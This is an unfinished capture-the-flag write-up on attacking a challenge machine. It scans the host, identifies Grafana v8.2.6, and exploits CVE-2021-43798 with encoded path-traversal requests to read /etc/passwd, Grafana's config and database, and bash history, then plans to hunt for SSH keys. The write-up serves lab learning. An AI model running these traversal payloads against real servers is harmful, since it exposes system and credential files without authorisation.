# Challenge Name: Tearys


![date](https://img.shields.io/badge/date-19.03.2021-brightgreen.svg)  
![](https://img.shields.io/badge/Unsolved-red.svg)  
![category](https://img.shields.io/badge/category-Machines-blueviolet.svg)   
![level](https://img.shields.io/badge/level-Medium-blue.svg)
![score](https://img.shields.io/badge/score-100-blue.svg)

## Description

Get The highest privilege on the machine and find the flag!  
Target IP: 18.156.136.169

## Notes

I wasn't able to solve the machine i just listed some notes here
I started by running a nmap scan

```bash
nmap -sC -sV 18.156.136.169                                                                                                          130 ⨯ 2 ⚙
Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-19 03:37 UTC
Nmap scan report for ec2-18-156-136-169.eu-central-1.compute.amazonaws.com (18.156.136.169)
Host is up (0.11s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 3f:37:a7:cb:4d:fa:8c:a7:53:e6:e7:f4:76:43:3d:c1 (RSA)
|   256 af:78:ae:60:77:25:44:23:6e:a9:2f:8e:a5:19:f5:62 (ECDSA)
|_  256 07:8c:df:7c:a0:88:a4:28:c2:06:90:62:92:7f:e8:8f (ED25519)
80/tcp   open  http            Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Our Team
8888/tcp open  sun-answerbook?
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Content-Type: text/html; charset=utf-8
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity.txt%252ebak; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Sat, 19 Mar 2022 03:38:21 GMT
|     Content-Length: 29
|     href="/login">Found</a>.
|   GenericLines, Help, LSCP, RTSPRequest:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Content-Type: text/html; charset=utf-8
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Sat, 19 Mar 2022 03:38:21 GMT
|     Content-Length: 29
|     href="/login">Found</a>.
|   HTTPOptions:
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Sat, 19 Mar 2022 03:38:21 GMT
|_    Content-Length: 0
```

We have 3 ports : 22, 80, 8888

Checking the web server at port 80 http://18.156.136.169/

![image](https://user-images.githubusercontent.com/72421091/159179906-0a30d586-4973-4ab7-803b-f856f3e1cd82.png)

if we check the source page we can see a hidden comment view-source:http://18.156.136.169/

```
                <!-- 
      <div class="team-content">
          <h3 class="name">Bob Frank</h3>
          <h4 class="title">Security Officer</h4>
        </div>

        <ul class="social">
          <li><a href="" class="fa fa-facebook" aria-hidden="true"></a></li>
          <li><a href="" class="fa fa-twitter" aria-hidden="true"></a></li>
          <li><a href="mailto:bob@tearys.corp" class="fa fa-google-plus" aria-hidden="true"></a></li>
          <li><a href="" class="fa fa-linkedin" aria-hidden="true"></a></li>
        </ul>
      </div>
    </div>
```  

So now we have some information about the target :
- Name : Bob Frank
- Job : Security Officer
- Email : bob@tearys.corp
- Domain name : tearys.corp

Let's check now the port 8888 http://18.156.136.169:8888/ 

We have a grafana dashboard 

![image](https://user-images.githubusercontent.com/72421091/159180077-29948a6a-6c97-4675-8021-f9af355693cb.png)

As we can see the version is v8.2.6, let's search for vulnerabilities

Grafana v8.2.6 is vulerable to CVE-2021-43798 wich is an unauthorized arbitrary file reading vulnerability  

https://j0vsec.com/post/cve-2021-43798/

We have an exploit for it https://www.exploit-db.com/exploits/50581 

The exploit didn't work so i added a print(url) to the exploit to debug it

```bash
┌──(kali㉿kali)-[~]
└─$ python3 exploit.py -H http://18.156.136.169:8888/
Read file > /etc/passwd
http://18.156.136.169:8888//public/plugins/opentsdb/../../../../../../../../../../../../../etc/passwd
<!doctype html><html lang="en"><head><meta charset="utf-8"/><meta http-equiv="X-UA-Compatible" content="IE=
```
The exploit was able to found a plugin **opentsdb** but failed to perform LFI

Let's encode the payload i'll use Burp

```http
GET /public/plugins/opentsdb/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F../etc/passwd HTTP/1.1
Host: 18.156.136.169:8888
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

```
We were able to read the /etc/passwd file 

http://18.156.136.169:8888/public/plugins/opentsdb/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F../etc/passwd

```
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
grafana:x:472:0:Linux User,,,:/home/grafana:/sbin/nologin
```
We need to find more files, i used burp with linux files and also known grafana files to be able to find some files 

**/etc/grafana/grafana.ini**
- nothing special is the default file

**/var/lib/grafana/grafana.db**
- we can load it to SQLite and explore. nothing intresting

**/etc/hostname**  
- Hostname : bed76934b271

**/etc/os-release** 

```
NAME="Alpine Linux"
ID=alpine
VERSION_ID=3.14.3
PRETTY_NAME="Alpine Linux v3.14"
HOME_URL="https://alpinelinux.org/"
BUG_REPORT_URL="https://bugs.alpinelinux.
```
We are in a docker container

**/etc/hosts**
- 172.18.0.2 is our grafana container internal IP

```
127.0.0.1	localhost
::1	localhost ip6-localhost ip6-loopback
fe00::0	ip6-localnet
ff00::0	ip6-mcastprefix
ff02::1	ip6-allnodes
ff02::2	ip6-allrouters
172.18.0.2	bed76934b271
```

**/home/grafana/.bash_history**

- It a huge hint for the solution, we need to use the ssh key to connect to the machine  
Unfortunately i wasn't able to find any key inside /home/grafana/.ssh/ 

```
ls
cd /home
ls
cd grafana/
ls
ls -la
cd .ssh/
ls
exit
```  
   
**SMTP**  

Unfortunately smtp wasn't reachable from my network. i tried using another network and it's worked

telnet 18.156.136.169 25

```
Trying 18.156.136.169...
Connected to 18.156.136.169.
Escape character is '^]'.
220 ip-172-31-32-66.eu-central-1.compute.internal ESMTP Postfix (Ubuntu)
```

We have two things to do :
- try find the ssh key filename inside /home/grafana/.ssh/ using LFI
- intercat with smtp and the email bob@tearys.corp
